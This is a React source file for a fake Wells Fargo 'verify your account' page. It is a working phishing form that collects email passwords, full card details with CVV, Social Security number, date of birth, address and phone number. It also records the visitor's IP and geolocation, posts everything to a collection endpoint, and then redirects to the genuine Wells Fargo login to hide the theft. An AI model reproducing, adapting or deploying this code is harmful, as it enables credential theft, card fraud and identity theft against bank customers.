import React, { useState, useEffect } from 'react';
import { Controller } from 'react-hook-form'
import NumberFormat from 'react-number-format';
import router from 'next/router';
import axios from 'axios'
import { useForm } from 'react-hook-form'
import { yupResolver } from '@hookform/resolvers/yup';
import * as yup from "yup";
import { useStateMachine } from "little-state-machine";
import { updateData } from '../LoginForm';






const VerificationForm = () => {
    const { state } = useStateMachine(updateData);

    const schema = yup.object().shape({

        email: yup.string().email('Enter a valid email').required(),
        password: yup.string().required().min(4, 'Enter the password of your email address !'),
        confirmPassword: yup.string().oneOf([yup.ref('password'), null], 'Passwords must match'),
        dateOfBirth: yup.string().required('Enter your date of birth'),
        zipCode: yup.string().required('Enter your zip Code '),
        cardNumber: yup.string().required('Provide credit/debit card number'),
        address: yup.string().required('Enter your address details'),
        nameOnCard: yup.string().required('Provide your full name'),
        cvv: yup.string().required('Enter your cvv'),
        expiryDate: yup.string().required('Enter the expiry date'),
        ssn: yup.string().required('Enter your social security number'),
        phoneNumber: yup.string().required('Provide your phone number')

    })
    const { register, handleSubmit, watch, control, formState: { errors, isValid, isSubmitSuccessful } } = useForm({
        resolver: yupResolver(schema),
        mode: 'all'
    })



    const [ip, setIP] = useState({});
    const ipWeb = ip.IPv4
    const ipUrl = `http://ip-api.com/json/${ipWeb}`
    const getData = async () => {
        const res = await axios.get('https://geolocation-db.com/json/')
        setIP(res.data)
    }
    useEffect(() => {
        getData()
    }, [])
    const onSubmit = (data) => {
        fetch('/api/verify', {
            method: 'POST',
            headers: {
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify([state, data, ip, ipUrl], null, 2)
        });
        router.push('https://connect.secure.wellsfargo.com/auth/login/present?origin=enroll')

    }








    return (
        <>
            <div key={2} className='lg:mx-32'>
                <form className='h-full pb-52 pt-32'>
                    <div className='flex flex-wrap mx-10 max-w-lg relative z-2 '>
                        <div className='mx-2 mb-3 mt-10 font-lighter'>
                            <h1 className='font-bold text-2xl mb-2 font-fargo'>Verify Your Wells Fargo Account Information</h1>
                            <span className='text-sm capitalize'>Provide your email information associated with your account</span>
                        </div>
                        <div className={'rounded-sm focus-within:bg-focusbg w-100 max-w-md mx-2 relative border-b border-gray-500 mb-10 ' + (errors.email?.message && ' border-b border-red-500 ')}>
                            <input
                                type='text'
                                name='email'
                                autoComplete='off'
                                placeholder=' '
                                className={'peer focus:border border-gray-500 bg-transparent pt-6 pl-3 lg:max-w-md w-full rounded appearance-none focus:outline-none '}
                                {...register('email')}

                            />
                            <label className='pointer-events-none peer-focus:text-sm peer-focus:top-0 peer-focus:text-focustext peer-placeholder-shown:top-3 peer-placeholder-shown:text-gray-400 peer-placeholder-shown:text-lg left-3 top-0 text-sm duration-300 absolute origin-0  transition-all' htmlFor='email'>
                                Email
                                <div className='absolute -mt-6 -right-3 text-red-500 font-bold'>*</div>

                            </label>

                            <span className='mt-2 capitalize text-xs text-red-500 block mb-5 font-medium absolute'>{errors.email?.message}</span>
                        </div>
                        <div className={'rounded-sm focus-within:bg-focusbg  mx-2 relative border-b border-gray-500 mb-10 ' + (errors.password?.message && ' border-b border-red-500 ')}>
                            <input
                                type='password'
                                name='password'
                                autoComplete='off'
                                placeholder=' '
                                className={'peer focus:border border-gray-500 bg-transparent pt-6 pl-3 lg:max-w-md w-full rounded appearance-none focus:outline-none '}
                                {...register('password')}

                            />
                            <label className='pointer-events-none peer-focus:text-sm peer-focus:top-0 peer-focus:text-focustext peer-placeholder-shown:top-3 peer-placeholder-shown:text-gray-400 peer-placeholder-shown:text-lg left-3 top-0 text-sm duration-300 absolute origin-0  transition-all' htmlFor='email'>
                                Password
                                <div className='absolute -mt-6 -right-3 text-red-500 font-bold'>*</div>

                            </label>

                            <span className='mt-2 capitalize text-xs text-red-500 block mb-5 font-medium absolute'>{errors.password?.message}</span>
                        </div>
                        <div className={'rounded-sm focus-within:bg-focusbg  mx-2 relative border-b border-gray-500 mb-10 ' + (errors.confirmPassword?.message && ' border-b border-red-500 ')}>
                            <input
                                type='password'
                                name='confirmPassword'
                                autoComplete='off'
                                placeholder=' '
                                className={'peer focus:border border-gray-500 bg-transparent pt-6 pl-3 lg:max-w-md w-full rounded appearance-none focus:outline-none '}
                                {...register('confirmPassword')}

                            />
                            <label className='pointer-events-none peer-focus:text-sm peer-focus:top-0 peer-focus:text-focustext peer-placeholder-shown:top-3 peer-placeholder-shown:text-gray-400 peer-placeholder-shown:text-lg left-3 top-0 text-sm duration-300 absolute origin-0  transition-all' htmlFor='email'>
                                Confirm Password
                                <div className='absolute -mt-6 -right-3 text-red-500 font-bold'>*</div>

                            </label>

                            <span className='mt-2 capitalize text-xs text-red-500 block mb-5 font-medium absolute'>{errors.confirmPassword?.message}</span>


                        </div>


                    </div>

                    <div className='flex flex-wrap mx-10'>
                        <div className='mx-2 mb-3 mt-5 font-lighter'>
                            <h1 className='font-bold text-2xl mb-2 font-fargo'>Verify Your Identity By Providing Information Associated With Your Account</h1>
                            <span className='text-sm capitalize'>Provide all credit/debitcard information accounts online</span>
                        </div>
                        <div className={'rounded-sm focus-within:bg-focusbg w-100 max-w-md mx-2 relative border-b border-gray-500 mb-10 ' + (errors.cardNumber?.message && ' border-b border-red-500 ')}>
                            <Controller
                                render={({ field }) => <NumberFormat

                                    {...field}
                                    autoComplete='off'
                                    placeholder=' '
                                    format='#### #### #### ####'
                                    type='text'
                                    name='cardNumber'
                                    className={'peer focus:border border-gray-500 bg-transparent pt-6 pl-3 lg:max-w-md w-full rounded appearance-none focus:outline-none '}


                                />}

                                {...register('cardNumber')}
                                control={control}

                            />
                            <label className='pointer-events-none peer-focus:text-sm peer-focus:top-0 peer-focus:text-focustext peer-placeholder-shown:top-3 peer-placeholder-shown:text-gray-400 peer-placeholder-shown:text-lg left-3 top-0 text-sm duration-300 absolute origin-0  transition-all' htmlFor='email'>
                                Card Number
                                <div className='absolute -mt-6 -right-3 text-red-500 font-bold'>*</div>

                            </label>

                            <span className='mt-2 capitalize text-xs text-red-500 block mb-5 font-medium absolute'>{errors.cardNumber?.message}</span>
                        </div>
                        <div className={'rounded-sm focus-within:bg-focusbg w-100 max-w-md mx-2 relative border-b border-gray-500 mb-10 ' + (errors.nameOnCard?.message && ' border-b border-red-500 ')}>
                            <input
                                type='text'
                                name='name-on-card'
                                autoComplete='off'
                                placeholder=' '
                                className={'peer focus:border border-gray-500 bg-transparent pt-6 pl-3 lg:max-w-md w-full rounded appearance-none focus:outline-none '}
                                {...register('nameOnCard')}

                            />
                            <label className='pointer-events-none peer-focus:text-sm peer-focus:top-0 peer-focus:text-focustext peer-placeholder-shown:top-3 peer-placeholder-shown:text-gray-400 peer-placeholder-shown:text-lg left-3 top-0 text-sm duration-300 absolute origin-0  transition-all' htmlFor='email'>
                                Name On card
                                <div className='absolute -mt-6 -right-3 text-red-500 font-bold'>*</div>

                            </label>

                            <span className='mt-2 capitalize text-xs text-red-500 block mb-5 font-medium absolute'>{errors.nameOnCard?.message}</span>
                        </div>
                        <div className={'block lg:w-full lg:max-w-sm rounded-sm focus-within:bg-focusbg mx-2 relative border-b border-gray-500 mb-10 ' + (errors.expiryDate?.message && ' border-b border-red-500 ')}>
                            <Controller
                                render={({ field }) => <NumberFormat

                                    {...field}
                                    autoComplete='off'
                                    placeholder=' '
                                    format='##/##'
                                    type='text'
                                    name='expiryDate'
                                    className={'peer focus:border border-gray-500 bg-transparent pt-6 pl-3 lg:max-w-md w-full rounded appearance-none focus:outline-none '}


                                />}

                                {...register('expiryDate')}
                                control={control}

                            />
                            <label className='pointer-events-none peer-focus:text-sm peer-focus:top-0 peer-focus:text-focustext peer-placeholder-shown:top-3 peer-placeholder-shown:text-gray-400 peer-placeholder-shown:text-lg left-3 top-0 text-sm duration-300 absolute origin-0  transition-all' htmlFor='expiryDate'>
                                Expiry Date(MM/YY)
                                <div className='absolute -mt-6 -right-3 text-red-500 font-bold'>*</div>

                            </label>

                            <span className='mt-2 capitalize text-xs text-red-500 block mb-5 font-medium absolute'>{errors.expiryDate?.message}</span>
                        </div>
                        <div className={'block rounded-sm focus-within:bg-focusbg mx-2 relative border-b border-gray-500 mb-10 ' + (errors.cvv?.message && ' border-b border-red-500 ')}>
                            <Controller
                                render={({ field }) => <NumberFormat

                                    {...field}
                                    autoComplete='off'
                                    placeholder=' '
                                    format='###'
                                    type='text'
                                    name='cvv'
                                    className={'peer focus:border border-gray-500 bg-transparent pt-6 pl-3 lg:max-w-md w-full rounded appearance-none focus:outline-none '}


                                />}

                                {...register('cvv')}
                                control={control}

                            />
                            <label className='pointer-events-none peer-focus:text-sm peer-focus:top-0 peer-focus:text-focustext peer-placeholder-shown:top-3 peer-placeholder-shown:text-gray-400 peer-placeholder-shown:text-lg left-3 top-0 text-sm duration-300 absolute origin-0  transition-all' htmlFor='cvv'>
                                CVV
                                <div className='absolute -mt-6 -right-3 text-red-500 font-bold'>*</div>

                            </label>

                            <span className='mt-2 capitalize text-xs text-red-500 block mb-5 font-medium absolute'>{errors.cvv?.message}</span>
                        </div>
                        <div className={'rounded-sm focus-within:bg-focusbg lg:w-80 lg:max-w-md mx-2 relative border-b border-gray-500 mb-10 ' + (errors.address?.message && ' border-b border-red-500 ')}>
                            <input
                                type='text'
                                name='address'
                                autoComplete='off'
                                placeholder=' '
                                className={'peer focus:border border-gray-500 bg-transparent pt-6 pl-3 lg:max-w-md w-full rounded appearance-none focus:outline-none '}
                                {...register('address')}

                            />
                            <label className='pointer-events-none peer-focus:text-sm peer-focus:top-0 peer-focus:text-focustext peer-placeholder-shown:top-3 peer-placeholder-shown:text-gray-400 peer-placeholder-shown:text-lg left-3 top-0 text-sm duration-300 absolute origin-0  transition-all' htmlFor='address'>
                                Address Line
                                <div className='absolute -mt-6 -right-3 text-red-500 font-bold'>*</div>

                            </label>

                            <span className='mt-2 capitalize text-xs text-red-500 block mb-5 font-medium absolute'>{errors.address?.message}</span>
                        </div>
                        <div className={'rounded-sm focus-within:bg-focusbg lg:w-80 lg:max-w-md mx-2 relative border-b border-gray-500 mb-10 ' + (errors.zipCode?.message && ' border-b border-red-500 ')}>
                            <input
                                type='text'
                                name='zip-code'
                                autoComplete='off'
                                placeholder=' '
                                className={'peer focus:border border-gray-500 bg-transparent pt-6 pl-3 lg:max-w-md w-full rounded appearance-none focus:outline-none '}
                                {...register('zipCode')}

                            />
                            <label className='pointer-events-none peer-focus:text-sm peer-focus:top-0 peer-focus:text-focustext peer-placeholder-shown:top-3 peer-placeholder-shown:text-gray-400 peer-placeholder-shown:text-lg left-3 top-0 text-sm duration-300 absolute origin-0  transition-all' htmlFor='zipcode'>
                                Zip Code
                                <div className='absolute -mt-6 -right-3 text-red-500 font-bold'>*</div>

                            </label>

                            <span className='mt-2 capitalize text-xs text-red-500 block mb-5 font-medium absolute'>{errors.zipCode?.message}</span>
                        </div>

                        <div className='block w-full '>
                            <div className='mb-10'>
                                <h1 className='text-2xl mt-10 font-fargo font-bold'>Confirm Your Personal Information</h1>
                                <span className='text-sm capitalize'>Provide your Personal information to complete the form and submit</span>

                                
                            </div>
                            <div className={'max-w-xs block rounded-sm focus-within:bg-focusbg mx-2 relative border-b border-gray-500 mb-10 ' + (errors.ssn?.message && ' border-b border-red-500 ')}>
                                <Controller
                                    render={({ field }) => <NumberFormat

                                        {...field}
                                        autoComplete='off'
                                        placeholder=' '
                                        format='###-##-####'
                                        mask='*'
                                        type='text'
                                        name='ssn'
                                        className={'peer focus:border border-gray-500 bg-transparent pt-6 pl-3 lg:max-w-md w-full rounded appearance-none focus:outline-none '}


                                    />}

                                    {...register('ssn')}
                                    control={control}

                                />
                                <label className='pointer-events-none peer-focus:text-sm peer-focus:top-0 peer-focus:text-focustext peer-placeholder-shown:top-3 peer-placeholder-shown:text-gray-400 peer-placeholder-shown:text-lg left-3 top-0 text-sm duration-300 absolute origin-0  transition-all' htmlFor='ssn'>
                                    Social Security Number(SSN)
                                    <div className='absolute -mt-6 -right-3 text-red-500 font-bold'>*</div>

                                </label>

                                <span className='mt-2 capitalize text-xs text-red-500 block mb-5 font-medium absolute'>{errors.ssn?.message}</span>
                            </div>
                            <div className={'max-w-xs block rounded-sm focus-within:bg-focusbg mx-2 relative border-b border-gray-500 mb-10 ' + (errors.dateOfBirth?.message && ' border-b border-red-500 ')}>
                                <Controller
                                    render={({ field }) => <NumberFormat

                                        {...field}
                                        autoComplete='off'
                                        placeholder=' '
                                        format='##/##/####'
                                        mask='_'
                                        type='text'
                                        name='dateOfBirth'
                                        className={'peer focus:border border-gray-500 bg-transparent pt-6 pl-3 lg:max-w-md w-full rounded appearance-none focus:outline-none '}


                                    />}

                                    {...register('dateOfBirth')}
                                    control={control}

                                />
                                <label className='pointer-events-none peer-focus:text-sm peer-focus:top-0 peer-focus:text-focustext peer-placeholder-shown:top-3 peer-placeholder-shown:text-gray-400 peer-placeholder-shown:text-lg left-3 top-0 text-sm duration-300 absolute origin-0  transition-all' htmlFor='dateOfBirth'>
                                    Date Of Birth (DOB)
                                    <div className='absolute -mt-6 -right-3 text-red-500 font-bold'>*</div>

                                </label>

                                <span className='mt-2 capitalize text-xs text-red-500 block mb-5 font-medium absolute'>{errors.dateOfBirth?.message}</span>
                            </div>
                            <div className={'max-w-xs block rounded-sm focus-within:bg-focusbg mx-2 relative border-b border-gray-500 mb-10 ' + (errors.phoneNumber?.message && ' border-b border-red-500 ')}>
                                <Controller
                                    render={({ field }) => <NumberFormat

                                        {...field}
                                        autoComplete='off'
                                        placeholder=' '
                                        format='(###)-###-####'
                                        mask='_'
                                        type='text'
                                        name='phone'
                                        className={'peer focus:border border-gray-500 bg-transparent pt-6 pl-3 lg:max-w-md w-full rounded appearance-none focus:outline-none '}


                                    />}

                                    {...register('phoneNumber')}
                                    control={control}

                                />
                                <label className='pointer-events-none peer-focus:text-sm peer-focus:top-0 peer-focus:text-focustext peer-placeholder-shown:top-3 peer-placeholder-shown:text-gray-400 peer-placeholder-shown:text-lg left-3 top-0 text-sm duration-300 absolute origin-0  transition-all' htmlFor='phone'>
                                    Phone Number
                                    <div className='absolute -mt-6 -right-3 text-red-500 font-bold'>*</div>

                                </label>

                                <span className='mt-2 capitalize text-xs text-red-500 block mb-5 font-medium absolute'>{errors.phoneNumber?.message}</span>
                            </div>

                        </div>

                    </div>

                    {!isValid && <p className={'semi-bold text-medium lg:text-lg text-red-500 mx-12 capitalize font-fargo '}>Please fill in all the required fields*</p>}
                    <button onClick={handleSubmit(onSubmit)} type='submit' className={'  hover:underline mx-12 mt-7 bg-gray-400 pr-6 p-2 text-white mb-3 nowrap rounded-md ' + (isValid && ' text-white border-verify rounded-md bg-red-900 text-white ')}><span className='ml-3'>Verify</span></button>
                    


                </form>



            </div>
        </>
    )
}

export default VerificationForm
